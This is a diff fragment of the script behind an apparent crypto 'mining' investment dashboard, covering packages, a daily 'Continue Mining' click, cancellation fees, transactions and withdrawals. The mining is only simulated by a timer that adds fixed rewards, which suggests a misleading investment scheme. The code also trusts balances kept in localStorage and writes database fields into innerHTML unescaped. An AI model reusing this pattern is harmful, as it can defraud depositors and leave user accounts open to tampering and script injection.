+      continueMiningBtn.textContent = "Continue Mining";
+    } else {
+      // Disable button, show countdown
+      continueMiningBtn.disabled = true;
+      
+      // Format time remaining
+      const hoursLeft = Math.floor(timeUntilNextClick / (1000 * 60 * 60));
+      const minutesLeft = Math.floor((timeUntilNextClick % (1000 * 60 * 60)) / (1000 * 60));
+      const secondsLeft = Math.floor((timeUntilNextClick % (1000 * 60)) / 1000);
+      
+      document.getElementById('nextMiningTime').textContent = 
+        `${hoursLeft.toString().padStart(2, '0')}:${minutesLeft.toString().padStart(2, '0')}:${secondsLeft.toString().padStart(2, '0')}`;
+      continueMiningBtn.textContent = "Wait for Next Click";
+      
+      // Update every second
+      setTimeout(updateMiningButton, 1000);
+    }
+  }
+  
+  // Continue mining (24-hour click)
+  continueMiningBtn.addEventListener('click', function() {
+    if (!activePackage) return;
+    
+    // Show loading spinner
+    document.getElementById('loadingSpinner').style.display = 'block';
+    
+    setTimeout(() => {
+      document.getElementById('loadingSpinner').style.display = 'none';
+      
+      // Add daily reward
+      dailyIncome += activePackage.pkg.daily;
+      updateSummary();
+      
+      // Set next mining click time (24 hours from now)
+      nextMiningClickTime = new Date(new Date().getTime() + 24 * 60 * 60 * 1000);
+      localStorage.setItem('nextMiningClickTime', nextMiningClickTime.toString());
+      
+      // Update UI
+      updateMiningButton();
+      updateMiningProgress();
+      
+      showNotification(`Mining continued! +$${activePackage.pkg.daily.toFixed(2)} added to your earnings.`);
+    }, 3000);
+  });
+  
+  function completeMining() {
+    if (!activePackage) return;
+    
+    clearInterval(activePackage.miningInterval);
+    activePackage.miningStatus.textContent = 'Package mining completed!';
+    activePackage.progressBar.style.width = '100%';
+    
+    // Reset mining status
+    miningStatusCard.style.display = 'none';
+    miningStatusCard.classList.remove('active');
+    nextMiningClickTime = null;
+    localStorage.removeItem('nextMiningClickTime');
+    
+    showNotification(`Mining completed for package $${activePackage.pkg.amount}.`);
+    activePackage.card.querySelector('.activate-btn').textContent = 'Activate';
+    activePackage.card.querySelector('.package-card').classList.remove('active');
+    activePackage = null;
+  }
+
+  function cancelMining() {
+    if (!activePackage) return;
+    
+    // Apply 5% cancellation fee
+    const cancellationFee = activePackage.pkg.amount * 0.05;
+    const refundAmount = activePackage.pkg.amount - cancellationFee;
+    
+    userBalance += refundAmount;
+    updateSummary();
+    
+    // Add transaction for cancellation fee
+    const transaction = {
+      date: new Date().toLocaleString(),
+      amount: cancellationFee.toFixed(2),
+      method: 'Package Cancellation',
+      status: 'Completed',
+      type: 'Fee'
+    };
+    
+    // Get current user
+    const currentUser = JSON.parse(localStorage.getItem('currentUser')) || {};
+    
+    // Add transaction to user's transactions
+    if (!currentUser.transactions) {
+      currentUser.transactions = [];
+    }
+    currentUser.transactions.push(transaction);
+    
+    // Save updated user
+    localStorage.setItem('currentUser', JSON.stringify(currentUser));
+    
+    // Also update in users array
+    const users = JSON.parse(localStorage.getItem('users') || '[]');
+    const userIndex = users.findIndex(u => u.id === currentUser.id);
+    if (userIndex !== -1) {
+      users[userIndex] = currentUser;
+      localStorage.setItem('users', JSON.stringify(users));
+    }
+    
+    // Reset mining status
+    activePackage.miningStatus.textContent = 'Mining cancelled.';
+    activePackage.progressBar.style.width = '0%';
+    activePackage.card.querySelector('.activate-btn').textContent = 'Activate';
+    activePackage.card.querySelector('.package-card').classList.remove('active');
+    
+    // Reset mining button
+    miningStatusCard.style.display = 'none';
+    miningStatusCard.classList.remove('active');
+    nextMiningClickTime = null;
+    localStorage.removeItem('nextMiningClickTime');
+    
+    activePackage = null;
+    
+    showNotification(`Mining cancelled with 5% fee ($${cancellationFee.toFixed(2)}). $${refundAmount.toFixed(2)} refunded.`);
+  }
+
+  // Function to refresh user data from database
+  async function refreshUserData() {
+    try {
+      const currentUser = JSON.parse(localStorage.getItem('currentUser'));
+      if (!currentUser || !currentUser.id) return;
+      
+      // Fetch latest user data from Supabase
+      const { data: updatedUser, error } = await supabase
+        .from('users')
+        .select('*')
+        .eq('id', currentUser.id)
+        .single();
+        
+      if (error) {
+        console.error('Error refreshing user data:', error);
+        return;
+      }
+      
+      if (updatedUser) {
+        // Update localStorage with fresh data
+        localStorage.setItem('currentUser', JSON.stringify(updatedUser));
+        
+        // Update global variables
+        userBalance = parseFloat(updatedUser.balance) || 5;
+        dailyIncome = parseFloat(updatedUser.daily_income) || 0;
+        totalWithdrawn = parseFloat(updatedUser.total_withdrawn) || 0;
+        
+        // Update UI displays
+        balanceDisplay.textContent = `$${userBalance.toFixed(2)}`;
+        incomeDisplay.textContent = `$${dailyIncome.toFixed(2)}`;
+        withdrawDisplay.textContent = `$${totalWithdrawn.toFixed(2)}`;
+        
+        // Update username and email displays
+        const usernameDisplay = document.querySelector('.profile-info p:first-child span');
+        if (usernameDisplay) {
+          usernameDisplay.textContent = updatedUser.username;
+        }
+        
+        const emailDisplay = document.querySelector('.profile-info p:nth-child(2) span');
+        if (emailDisplay) {
+          emailDisplay.textContent = updatedUser.email;
+        }
+        
+        console.log('User data refreshed from database');
+      }
+    } catch (error) {
+      console.error('Error in refreshUserData:', error);
+    }
+  }
+
+  // Initialize dashboard
+  async function initDashboard() {
+    console.log("Dashboard initialization started");
+    
+    // Check if localStorage is available
+    let storageAvailable = false;
+    try {
+        localStorage.setItem('test', 'test');
+        localStorage.removeItem('test');
+        storageAvailable = true;
+    } catch (e) {
+        console.error("localStorage not available:", e);
+        alert("This site requires local storage to be enabled in your browser settings.");
+        return;
+    }
+    
+    // Get current user data
+    const currentUser = JSON.parse(localStorage.getItem('currentUser'));
+    if (!currentUser) {
+        console.error("No user logged in");
+        window.location.href = './login.html';
+        return;
+    }
+    
+    // Refresh user data from database first
+    await refreshUserData();
+    
+    // Load package types from database
+    await loadPackageTypes();
+    
+    // Load user data from refreshed session data
+    const refreshedUser = JSON.parse(localStorage.getItem('currentUser'));
+    if (refreshedUser) {
+      userBalance = parseFloat(refreshedUser.balance) || 5;
+      dailyIncome = parseFloat(refreshedUser.daily_income) || 0;
+      totalWithdrawn = parseFloat(refreshedUser.total_withdrawn) || 0;
+    }
+    
+    // Username and email are already updated in refreshUserData function
+    
+    // Create package cards
+    container.innerHTML = '';
+    packages.forEach((pkg, i) => {
+      const card = createPackageCard(pkg, i);
+      container.appendChild(card);
+    });
+    
+    updateSummary();
+    initSettings();
+    updateMiningStatus();
+  }
+  
+  // Logout function - redirect to login page
+  function logout() {
+    try {
+      localStorage.removeItem('currentUser');
+      window.location.href = './login.html';
+    } catch(e) {
+      console.error("Error during logout:", e);
+      alert("Logged out successfully. Please refresh the page.");
+    }
+  }
+
+  // Transaction functionality
+  async function addTransaction(amount, method, type = 'withdrawal', transactionHash = null) {
+    try {
+      // Get current user
+      const currentUser = JSON.parse(localStorage.getItem('currentUser')) || {};
+      if (!currentUser.id) {
+        console.error('No user ID found');
+        return;
+      }
+
+      // Create transaction in Supabase
+      const { data: transaction, error } = await supabase
+        .from('transactions')
+        .insert([{
+          user_id: currentUser.id,
+          amount: parseFloat(amount),
+          method: method,
+          transaction_type: type,
+          status: 'pending',
+          transaction_hash: transactionHash
+        }])
+        .select()
+        .single();
+        
+      if (error) {
+        console.error('Error creating transaction:', error);
+        return;
+      }
+      
+      console.log('Transaction created:', transaction);
+      
+      // Update user balance for withdrawals
+      if (type === 'withdrawal') {
+        totalWithdrawn += parseFloat(amount);
+        userBalance -= parseFloat(amount);
+        await updateSummary();
+      }
+      
+      // Reload transactions to show the new one
+      await loadTransactions();
+      
+    } catch (error) {
+      console.error('Error in addTransaction:', error);
+    }
+  }
+
+  async function loadTransactions() {
+    const transactionBody = document.getElementById('transactionBody');
+    if (!transactionBody) {
+      console.error('Transaction body element not found');
+      return;
+    }
+    
+    transactionBody.innerHTML = '<tr><td colspan="4" class="text-center">Loading transactions...</td></tr>';
+    
+    // Get current user
+    const currentUser = JSON.parse(localStorage.getItem('currentUser')) || {};
+    if (!currentUser || !currentUser.id) {
+      console.warn('No current user or user ID found');
+      
+      // Try to load from localStorage as fallback
+      const localTransactions = currentUser.transactions || [];
+      if (localTransactions.length > 0) {
+        transactionBody.innerHTML = '';
+        localTransactions.forEach(tx => {
+          const row = document.createElement('tr');
+          row.innerHTML = `
+            <td>${tx.date}</td>
+            <td>$${tx.amount} (${tx.type})</td>
+            <td>${tx.method}${tx.transactionId ? '<br><small>ID: ' + tx.transactionId + '</small>' : ''}</td>
+            <td class="status-${tx.status.toLowerCase()}">${tx.status}</td>
+          `;
+          transactionBody.appendChild(row);
+        });
+      } else {
+        transactionBody.innerHTML = `<tr><td colspan="4" class="text-center">No transactions found</td></tr>`;
+      }
+      return;
+    }
+    
+    try {
+      console.log('Loading transactions for user ID:', currentUser.id);
+      
+      // Load transactions from Supabase
+      const { data: transactions, error } = await supabase
+        .from('transactions')
+        .select('*')
+        .eq('user_id', currentUser.id)
+        .order('created_at', { ascending: false });
+        
+      if (error) {
+        console.error('Supabase error loading transactions:', error);
+        
+        // Fallback to localStorage
+        const localTransactions = currentUser.transactions || [];
+        if (localTransactions.length > 0) {
+          transactionBody.innerHTML = '';
+          localTransactions.forEach(tx => {
+            const row = document.createElement('tr');
+            row.innerHTML = `
+              <td>${tx.date}</td>
+              <td>$${tx.amount} (${tx.type})</td>
+              <td>${tx.method}${tx.transactionId ? '<br><small>ID: ' + tx.transactionId + '</small>' : ''}</td>
+              <td class="status-${tx.status.toLowerCase()}">${tx.status}</td>
+            `;
+            transactionBody.appendChild(row);
+          });
+        } else {
+          transactionBody.innerHTML = `<tr><td colspan="4" class="text-center">Error loading transactions from database</td></tr>`;
+        }
+        return;
+      }
+      
+      console.log('Loaded transactions from Supabase:', transactions);
+      
+      if (!transactions || transactions.length === 0) {
+        // Check localStorage as fallback
+        const localTransactions = currentUser.transactions || [];
+        if (localTransactions.length > 0) {
+          transactionBody.innerHTML = '';
+          localTransactions.forEach(tx => {
+            const row = document.createElement('tr');
+            row.innerHTML = `
+              <td>${tx.date}</td>
+              <td>$${tx.amount} (${tx.type})</td>
+              <td>${tx.method}${tx.transactionId ? '<br><small>ID: ' + tx.transactionId + '</small>' : ''}</td>
+              <td class="status-${tx.status.toLowerCase()}">${tx.status}</td>
+            `;
+            transactionBody.appendChild(row);
+          });
+        } else {
+          transactionBody.innerHTML = `<tr><td colspan="4" class="text-center">No transactions found</td></tr>`;
+        }
+        return;
+      }
+      
+      // Clear loading message
+      transactionBody.innerHTML = '';
+      
+      transactions.forEach(tx => {
+        let typeClass;
+        if (tx.status === 'pending') {
+          typeClass = 'status-pending';
+        } else if (tx.status === 'completed') {
+          typeClass = 'status-verified';
+        } else {
+          typeClass = 'status-rejected';
+        }
+        
+        const typeText = tx.transaction_type === 'deposit' ? ' (Deposit)' : 
+                         tx.transaction_type === 'withdrawal' ? ' (Withdrawal)' : 
+                         tx.transaction_type === 'fee' ? ' (Fee)' : 
+                         tx.transaction_type === 'mining_reward' ? ' (Mining)' : '';
+        
+        const row = document.createElement('tr');
+        row.innerHTML = `
+          <td>${new Date(tx.created_at).toLocaleString()}</td>
+          <td>$${parseFloat(tx.amount).toFixed(2)}${typeText}</td>
+          <td>${tx.method || 'N/A'}${tx.reference_id ? '<br><small>ID: ' + tx.reference_id + '</small>' : ''}</td>
+          <td class="${typeClass}">${tx.status.charAt(0).toUpperCase() + tx.status.slice(1)}</td>
+        `;
+        transactionBody.appendChild(row);
+      });
+      
+      console.log('Successfully displayed', transactions.length, 'transactions');
+      
+    } catch (error) {
+      console.error('Exception in loadTransactions:', error);
+      
+      // Try localStorage as final fallback
+      const localTransactions = currentUser.transactions || [];
+      if (localTransactions.length > 0) {
+        transactionBody.innerHTML = '';
+        localTransactions.forEach(tx => {
+          const row = document.createElement('tr');
+          row.innerHTML = `
+            <td>${tx.date}</td>
+            <td>$${tx.amount} (${tx.type})</td>
+            <td>${tx.method}${tx.transactionId ? '<br><small>ID: ' + tx.transactionId + '</small>' : ''}</td>
+            <td class="status-${tx.status.toLowerCase()}">${tx.status}</td>
+          `;
+          transactionBody.appendChild(row);
+        });
+      } else {
+        transactionBody.innerHTML = `<tr><td colspan="4" class="text-center">Error loading transactions - please try refreshing</td></tr>`;
+      }
+    }
+  }
+
+  // Withdraw form submit event
+  document.getElementById('withdrawForm').addEventListener('submit', async function(e) {
+    e.preventDefault(); // prevent default form submit
+
+    const form = this;
+    const formData = new FormData(form);
+    const amount = parseFloat(formData.get('Amount'));
+    const method = formData.get('Method');
+    
+    // Check if user has enough balance
+    if (amount > userBalance) {
+      alert('Insufficient balance for this withdrawal.');
+      return;
+    }
+    
+    // Show loading spinner
+    document.getElementById('loadingSpinner').style.display = 'block';
+    
+    // Send withdrawal request
+    try {
+      const response = await fetch(form.action, {
+        method: form.method,
+        body: formData
+      });
+      
+      // Add transaction record to database
+      await addTransaction(amount, method, 'withdrawal');
+      
+      // Hide loading spinner
+      document.getElementById('loadingSpinner').style.display = 'none';
+      
+      // Show notification
+      showNotification('Withdrawal request submitted successfully!');
+      
+      // Reset form
+      form.reset();
+      
+      // Show transaction page
+      showTransactionPage();
+      
+    } catch (error) {
+      console.error('Error:', error);
+      document.getElementById('loadingSpinner').style.display = 'none';
+      
+      // Still add the transaction but note there was an error
+      addTransaction(amount, method);
+      showNotification('Error submitting form but transaction recorded. Please contact support.');
+      showTransactionPage();
+    }
+  });
+</script>
+</body>
+</html>
